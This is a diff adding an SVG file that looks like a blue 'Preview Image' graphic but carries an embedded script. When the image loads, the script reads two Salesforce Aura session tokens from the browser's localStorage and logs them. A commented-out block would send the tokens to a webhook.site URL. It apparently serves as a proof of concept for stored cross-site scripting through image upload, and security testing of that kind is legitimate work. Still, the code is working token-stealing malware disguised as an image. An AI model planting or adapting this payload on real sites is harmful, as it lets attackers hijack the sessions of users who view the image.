@@ -1,0 +1,62 @@
+<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100" viewBox="0 0 100 100">
+  <!-- Visible harmless-looking graphic -->
+  <rect width="100" height="100" fill="#0176d3" opacity="0.9"/>
+  <text x="50" y="50" font-family="Arial" font-size="8" text-anchor="middle" fill="white" dominant-baseline="middle">Preview Image</text>
+  
+  <script type="text/javascript">
+    //<![CDATA[
+      (function() {
+        try {
+          setTimeout(function() {
+            // Target both potential Aura tokens from the screenshot
+            var tokenKeys = [
+              '$AuraClientService.token$desktopDashboards:dashboardApp',
+              '$AuraClientService.token$reports:lightningReportApp'
+            ];
+            
+            var foundTokens = [];
+            
+            // Check for each token
+            tokenKeys.forEach(function(key) {
+              var token = localStorage.getItem(key);
+              if (token) {
+                foundTokens.push(key + ": " + token);
+              }
+            });
+            
+            if (foundTokens.length > 0) {
+              // Create visible output in the SVG
+              var output = document.createElementNS("http://www.w3.org/2000/svg", "text");
+              output.setAttribute("x", "50");
+              output.setAttribute("y", "70");
+              output.setAttribute("font-family", "Arial");
+              output.setAttribute("font-size", "5");
+              output.setAttribute("text-anchor", "middle");
+              output.setAttribute("fill", "yellow");
+              output.textContent = foundTokens.length + " token(s) found";
+              document.documentElement.appendChild(output);
+              
+              // Output to console with formatting
+              console.log("%c=== Aura Tokens Found ===", "color: #0176d3; font-weight: bold;");
+              foundTokens.forEach(function(token, index) {
+                console.log("%c" + (index+1) + ". " + token.split(":")[0] + ":", "color: #032d60;");
+                console.log(token.split(":")[1]);
+              });
+              
+              // Optional: Send to webhook (first 20 chars only)
+              // foundTokens.forEach(function(token) {
+              //   new Image().src = 'https://webhook.site/b0930745-f9c1-4b40-931a-cd1084cdce24?k=' + 
+              //     encodeURIComponent(token.split(":")[0]) + '&t=' + 
+              //     encodeURIComponent(token.split(":")[1].substring(0, 20));
+              // });
+            } else {
+              console.log("%cNo Aura tokens found in Local Storage", "color: #ff0000;");
+            }
+          }, 800); // Slightly longer delay for preview mode
+        } catch(e) {
+          console.error("Token access error:", e);
+        }
+      })();
+    //]]>
+  </script>
+</svg>
